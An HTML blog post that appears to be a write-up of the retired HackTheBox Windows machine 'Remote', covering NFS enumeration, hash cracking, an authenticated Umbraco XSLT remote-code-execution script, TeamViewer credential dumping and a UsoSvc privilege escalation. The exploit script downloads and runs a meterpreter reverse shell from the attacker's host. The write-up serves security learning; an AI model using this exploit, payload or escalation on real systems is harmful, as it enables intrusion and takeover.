
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Remote published by mrb3n on Mars the 21th 2020. This box is a Windows machine classified as easy. It implies a NFS share, a vulnerable CMS, TeamViewer and a second unintended way towards root." />
<meta name="keywords" content="security, boot2root, HTB, windows, umbraco, teamviewer, metasploit, msfvenom">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Remote"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Remote published by mrb3n on Mars the 21th 2020. This box is a Windows machine classified as easy. It implies a NFS share, a vulnerable CMS, TeamViewer and a second unintended way towards root."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/11/htb-remote.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-11-10 20:50:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="windows"/>
  <meta property="article:tag" content="umbraco"/>
  <meta property="article:tag" content="teamviewer"/>
  <meta property="article:tag" content="metasploit"/>
  <meta property="article:tag" content="msfvenom"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Remote</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-remote">HTB: Remote</h1>
    <p>
      Posted on 10 Nov 2020 in <a href="../../category/security.html">security</a>

        &#8226; 6 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.11/remote_card.png" alt="Remote card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/234">Remote</a> published by
<a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a> on Mars the 21th 2020.
This box is a Windows machine classified as easy. It implies a NFS share, a
vulnerable CMS, TeamViewer and a second unintended way towards root.</p>


<h1>Initial foothold</h1>
<p>We start with an nmap scan. 10 ports are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Mar 26 10:51:40 2020 as: nmap -sS -oN nmap2 --top-ports=10000 -sV 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.30s latency).
Not shown: 8310 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 26 11:02:07 2020 -- 1 IP address (1 host up) scanned in 626.37 seconds
</code></pre></div>

<p>For each port we will look what service is running an how we can enumerate them:</p>
<ul>
<li>Port 21: FTP, <strong>we will dig it more</strong></li>
<li>Port 80: A website, <strong>we will dig it more</strong></li>
<li>Port 111: rpcbind, nothing here</li>
<li>Port 135: MS Windows RPC, nothing here</li>
<li>Port 139 and 445: SMB, <strong>we will dig it more</strong></li>
<li>Port 2049: NFS, <strong>we will dig it more</strong></li>
<li>Port 5985: some HTTP service but nothing available</li>
<li>Port 47001: some HTTP service but nothing available</li>
<li>Port 49678: MS Windows RPC, nothing here</li>
</ul>
<h2>FTP</h2>
<p>We try to connect to the FTP using an anonymous connection. At this time (Mars
27th 2020) Firefox still support this protocol. But there is no file available
with the anonymous account.</p>
<p><img alt="anonymous FTP" src="/media/2020.11/remote_02.png"></p>
<h2>SMB</h2>
<p>We try to enumerate the SMB share and users using the metasploit modules
<code>auxiliary/scanner/smb/smb_enumshares</code> and
<code>auxiliary/scanner/smb/smb_enumshares</code> but there is nothing interesting here.</p>
<h2>Web</h2>
<p>The home page is about selling products. We quickly browse the website but
nothing really pop out.</p>
<p><img alt="Website homepage" src="/media/2020.11/remote_04.png"></p>
<p>We run <a href="https://github.com/ffuf/ffuf">fuff</a> a <code>Go</code> equivalent of <code>dirb</code> with the
<code>big.txt</code> wordlist from dirb. This allow us to found the "umbraco" login page.</p>
<div class="highlight"><pre><span></span><code>$ ./ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.180/FUZZ -mc 200 -c -v
&lt;SNIP&gt;
[Status: 200, Size: 4040, Words: 710, Lines: 96]
| URL | http://10.10.10.180/umbraco
</code></pre></div>

<p><img alt="Umbraco login page" src="/media/2020.11/remote_01.png"></p>
<p>There is a few exploits for this CMS but we do not have any credentials to login.</p>
<h2>NFS</h2>
<p>We enumerate the NFS share using the <code>auxiliary/scanner/nfs/nfsmount</code> metasploit
module. We found that the share <code>/site_backups</code> is exposed.</p>
<div class="highlight"><pre><span></span><code>msf5 &gt; use auxiliary/scanner/nfs/nfsmount
msf5 auxiliary(scanner/nfs/nfsmount) &gt; set RhOSTS 10.10.10.180
RhOSTS =&gt; 10.10.10.180
msf5 auxiliary(scanner/nfs/nfsmount) &gt; run

[+] 10.10.10.180:111      - 10.10.10.180 NFS Export: /site_backups []
[*] 10.10.10.180:111      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre></div>

<p>We mount the share in a temporary folder using <code>mount</code>. A few Google search lead
us to the <a href="https://our.umbraco.com/forum/umbraco-8/96468-umbraco-8-database-file">umbraco configuration file</a>.</p>
<div class="highlight"><pre><span></span><code>$ mkdir /tmp/nfs
$ mount -t nfs 10.10.10.180:/site_backups /tmp/nfs -nolock
$ cd /tmp/nfs/
$ ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
$ ls App_Data
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
</code></pre></div>

<p>We copy it on our local folder and run <code>string</code> on it. The password hash for the
account "admin@htb.local’ is in the first lines.</p>
<div class="highlight"><pre><span></span><code>strings ~/pentest/htb_remote/Umbraco.sdf  | less
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
</code></pre></div>

<p>We run John the ripper with the Rockyou word list against the hash and found the
password "baconandcheese".</p>
<div class="highlight"><pre><span></span><code>$ john hash -w=tools/password_lists/rockyou.txt
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)
</code></pre></div>

<p>The credentials admin@htb.local:baconandcheese allow us ton connect to the
Umbraco interface.</p>
<p><img alt="Umbraco admin interface" src="/media/2020.11/remote_05.png"></p>
<h2>Exploiting Umbraco</h2>
<p>As previously mentioned there is a few exploit for Umbraco.</p>
<div class="highlight"><pre><span></span><code>$ searchsploit umbraco
--------------------------------------- ----------------------------------------
Exploit Title                         |  Path
                                      | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
Umbraco CMS - Remote Command Execution | exploits/windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) R | exploits/aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 -  | exploits/php/webapps/44988.txt
--------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
</code></pre></div>

<p>We want to use "Umbraco CMS 7.12.4 - (Authenticated) Remote code execution". We
get the script from our local exploitdb. Looking at the POC, it is launching a
<code>calc.exe</code> on the server. We try it to see if we get an error.</p>
<p>As there is no error we modifiy it to obtain a reverse shell:
  * we use msfvenom to create a meterpreter: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt;reverse.exe</code>
  * we run a python simple HTTP server to share the executable
  * we run metasploit multi handler
  * Using <code>powershell</code> we download the executable binary and run it</p>
<p>The script is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span>

<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span><span class="p">;</span>

<span class="k">def</span> <span class="nf">print_dict</span><span class="p">(</span><span class="n">dico</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">dico</span><span class="o">.</span><span class="n">items</span><span class="p">());</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Start&quot;</span><span class="p">);</span>

<span class="c1"># Execute a calc for the PoC</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; </span><span class="se">\</span>
<span class="s1">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; </span><span class="se">\</span>
<span class="s1">xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;</span><span class="se">\</span>
<span class="s1">&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() </span><span class="se">\</span>
<span class="s1">{ string cmd = &quot;mkdir /tmp;iwr -uri http://10.10.14.80:8081/reverse.exe -outfile /tmp/reverse.exe;/tmp/reverse.exe&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\</span>
<span class="s1">proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = cmd;</span><span class="se">\</span>
<span class="s1">proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span class="se">\</span>
<span class="s1">proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span class="se">\</span>
<span class="s1">&lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;</span><span class="se">\</span>
<span class="s1">&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#39;</span><span class="p">;</span>

<span class="n">login</span> <span class="o">=</span> <span class="s2">&quot;admin@htb.local&quot;</span><span class="p">;</span>
<span class="n">password</span><span class="o">=</span><span class="s2">&quot;baconandcheese&quot;</span><span class="p">;</span>
<span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;http://10.10.10.180&quot;</span><span class="p">;</span>


<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/&quot;</span><span class="p">;</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_main</span><span class="p">);</span>
<span class="n">print_dict</span><span class="p">(</span><span class="n">r1</span><span class="o">.</span><span class="n">cookies</span><span class="p">);</span>


<span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot;</span><span class="p">;</span>
<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="n">password</span><span class="p">};</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">);</span>


<span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot;</span><span class="p">;</span>
<span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">);</span>

<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">);</span>
<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;__VIEWSTATE&quot;</span><span class="p">)[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span>
<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;__VIEWSTATEGENERATOR&quot;</span><span class="p">)[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span>
<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;UMB-XSRF-TOKEN&#39;</span><span class="p">];</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;UMB-XSRF-TOKEN&#39;</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;__EVENTTARGET&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;__EVENTARGUMENT&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;__VIEWSTATE&quot;</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s2">&quot;__VIEWSTATEGENERATOR&quot;</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s2">&quot;ctl00$body$xsltSelection&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s2">&quot;ctl00$body$contentPicker$ContentIdValue&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;ctl00$body$visualizeDo&quot;</span><span class="p">:</span><span class="s2">&quot;Visualize+XSLT&quot;</span><span class="p">};</span>


<span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">);</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;End&quot;</span><span class="p">);</span>
</code></pre></div>

<p>That allow us to get a meterpreter on the box.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; getuid
Server username: IIS APPPOOL\DefaultAppPool
</code></pre></div>

<p>We can then use the meterpeter search function to found the user flag.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; search -f user.txt
Found 1 result...
    c:\Users\Public\user.txt (34 bytes)
meterpreter &gt; cat &quot;c:\Users\Public\user.txt&quot;
fd2b1f187e6f48be38c224cdcb61faf5
</code></pre></div>

<h1>Getting Root</h1>
<h2>TeamViewer way</h2>
<p>We run simple <code>ps</code> on the system to list the process.
We easily spot the TeamViewer process.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; ps
&lt;SNIP&gt;
2852  628   svchost.exe
2860  628   svchost.exe
2884  628   svchost.exe
2936  628   svchost.exe
2944  628   TeamViewer_Service.exe
</code></pre></div>

<p>A few Google search lead us to a metasploit post module to retrieve TeamViewer passwords</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
</code></pre></div>

<p>I struggle a lot there trying to connect to the TeamViewer session.
First I looted the TeamViewer ID in
<code>C:\Program Files (x86)\TeamViewer\Version7\TeamViewer7_Logfile.log</code> first lines.</p>
<p>As the box is not connected to the Internet it is not possible to connect using
the TeamViewer ID.  Therefore I tried to connect localy
<a href="https://community.teamviewer.com/t5/Knowledge-Base/Can-TeamViewer-be-used-within-a-local-network-LAN-only/ta-p/4618">using directly the IP address</a>
but this also doesn't work.</p>
<p><img alt="TeamViewer" src="/media/2020.11/remote_03.png"></p>
<p>The solution was simpler as this is a simple password reuse. We fire a psexec
and connect as administrator using
the TeamViewer password and got a shell as administrator and can easily get
the root flag.</p>
<div class="highlight"><pre><span></span><code>root@kalili:~/installed_tools/impacket/examples# psexec.py administrator@10.10.10.180
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file AmYWRVZa.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service PmSN on 10.10.10.180.....
[*] Starting service PmSN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;cd C:\Users\administrator\Desktop

C:\Users\Administrator\Desktop&gt;type root.txt
66f9b552d94ea7c55919dc1bfbaff7e1
</code></pre></div>

<h2>Using CVE-2019-1322</h2>
<p>There is another unintended method to root this box. This method is not reliable
as the command to start the Update Orchestrator Service sometime return an error
(maybe because I used public servers and other players were also starting and stop the service).</p>
<p>We run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Windows PEASS</a>
on the box. The output shows that some patches are missing mostly the one for
CVE-2019-1322.</p>
<div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 17763
      [!] CVE-2019-0836 : VULNERABLE
        [&gt;] https://exploit-db.com/exploits/46718
        [&gt;] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

      [!] CVE-2019-0841 : VULNERABLE
        [&gt;] https://github.com/rogue-kdc/CVE-2019-0841
        [&gt;] https://rastamouse.me/tags/cve-2019-0841/

      [!] CVE-2019-1064 : VULNERABLE
        [&gt;] https://www.rythmstick.net/posts/cve-2019-1064/

      [!] CVE-2019-1130 : VULNERABLE
        [&gt;] https://github.com/S3cur3Th1sSh1t/SharpByeBear

      [!] CVE-2019-1253 : VULNERABLE
        [&gt;] https://github.com/padovah4ck/CVE-2019-1253

      [!] CVE-2019-1315 : VULNERABLE
        [&gt;] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

      [!] CVE-2019-1385 : VULNERABLE
        [&gt;] https://www.youtube.com/watch?v=K6gHnr-VkAg

      [!] CVE-2019-1388 : VULNERABLE
        [&gt;] https://github.com/jas502n/CVE-2019-1388

      [!] CVE-2019-1405 : VULNERABLE
        [&gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
</code></pre></div>

<p>As the <a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/">article</a>
precise we can run commands as <code>SYSTEM</code> on the box so we stop the service,
configure it to copy the root flag in <code>C:\a.txt</code> and start the service again.</p>
<div class="highlight"><pre><span></span><code>C:\windows\system32\inetsrv&gt;sc.exe stop UsoSvc
sc.exe stop UsoSvc
[SC] ControlService FAILED 1062:

The service has not been started.


C:\windows\system32\inetsrv&gt;sc config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;
sc config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;
[SC] ChangeServiceConfig SUCCESS

C:\windows\system32\inetsrv&gt;sc.exe start UsoSvc
sc.exe start UsoSvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
</code></pre></div>

<p>We can now get the root flag.</p>
<div class="highlight"><pre><span></span><code>C:\windows\system32\inetsrv&gt;type C:\a.txt
type C:\a.txt
66f9b552d94ea7c55919dc1bfbaff7e1
</code></pre></div>

<h1>Wrapping up</h1>
<p>This box was supposed to be easy. Clearly the root part took me way too long. My
metasploit was outdated and doesn't had the post module for TeamViewer. And
after getting the TeamViewer credentials I really tried to connect using the
solution.</p>
<p>Nevertheless the box was really interesting.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/windows.html">windows</a>
      <a href="../../tag/umbraco.html">umbraco</a>
      <a href="../../tag/teamviewer.html">teamviewer</a>
      <a href="../../tag/metasploit.html">metasploit</a>
      <a href="../../tag/msfvenom.html">msfvenom</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2020/10/htb-blunder.html" title="HTB: Blunder">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/11/htb-tabby.html" title="HTB: Tabby">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>